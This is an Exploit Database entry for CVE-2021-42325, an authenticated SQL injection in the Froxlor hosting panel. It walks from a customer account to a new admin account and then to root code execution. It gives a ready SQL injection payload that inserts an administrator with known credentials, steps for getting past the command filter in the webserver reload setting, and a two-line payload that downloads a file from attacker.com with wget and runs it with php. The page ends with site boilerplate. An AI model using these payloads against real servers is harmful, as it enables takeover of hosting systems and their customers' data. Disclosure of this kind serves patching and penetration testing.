```
# Exploit Title: Froxlor 0.10.29.1 - SQL Injection (Authenticated)
# Exploit Author: Martin Cernac
# Date: 2021-11-05
# Vendor: Froxlor (https://froxlor.org/)
# Software Link: https://froxlor.org/download.php
# Affected Version: 0.10.28, 0.10.29, 0.10.29.1
# Patched Version: 0.10.30
# Category: Web Application
# Tested on: Ubuntu
# CVE: 2021-42325

# 1. Technical Description:
#
# Froxlor 0.10.28 and 0.10.29.x are affected by an SQL Injection from the authenticated customer panel. This allows an attacker to escalate privilege by creating a Froxlor administrator account and use it to get Remote Code Execution as root on the target machine.
#
# 1.1 Pre-requisites
#  - Access to a customer account
#  - Ability to specify database name when creating a database
#    - Feature only availible from 0.10.28 onward and must be manually enabled

# 2. Proof Of Concept (PoC):
#
# The following is a walkthrough of privilege escalation from a mere customer to an admin and achieving RCE as root
#
# 2.1 Privilege Escalation
#
# - Sign into Froxlor as a customer
# - View your databases
# - Create a database
# - Put your payload into the "User/Database name" field (if enabled)
# - Application will error out however your SQL query will be executed
#
# The following is a POST request example of running the payload provided, resulting in an administrator account being created
---
POST /froxlor/customer_mysql.php?s=fdbdf63173d0b332ce13a148476499b2 HTTP/1.1
Host: localhost

---
#
# 2.2 Remote Code Execution
#
# To achieve RCE as root:
#
# - Sign into Froxlor as the newly created admin account (payload example creds are x:a)
# - Go to System Settings
# - Go to Webserver settings
# - Adjust "Webserver reload command" field to a custom command
# - The command must not contain any of the following special characters: ;|&><`$~?
#   - For details, see "safe_exec" function in lib/Froxlor/FileDir.php
#   - For example commands see Payloads 4.2 section
# - Trigger configuration file rebuild
#   - Use menu item "Rebuild config files"
# - Await a root cron job to execute your command

# 3. Vulnerable resources and parameters
# /customer_mysql.php (POST field: custom_suffix)

# 4. Payloads
#
# 4.1 SQL Injection payload
#  The following payload creates a new Froxlor admin with full access to all customers and the server configuration
#  The credentials are:
#   - username: x
#   - password: a
#
# `;insert into panel_admins (loginname,password,customers_see_all,domains_see_all,caneditphpsettings,change_serversettings) values ('x','$5$ccd0bcdd9ab970b1$Hx/a0W8QHwTisNoa1lYCY4s3goJeh.YCQ3hWqH1ZUr8',1,1,1,1);--
#
#
# 4.2 Remote Code Execution payload
#  Two part payload:
#  - wget http://attacker.com/malicious.txt -O /runme.php
#  - php /runme.php

# 5. Timeline
# 2021-10-11 Discovery
# 2021-10-11 Contact with developer
# 2021-10-11 Patch issued but no release rolled out
# 2021-10-12 Reserved CVE-2021-42325

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
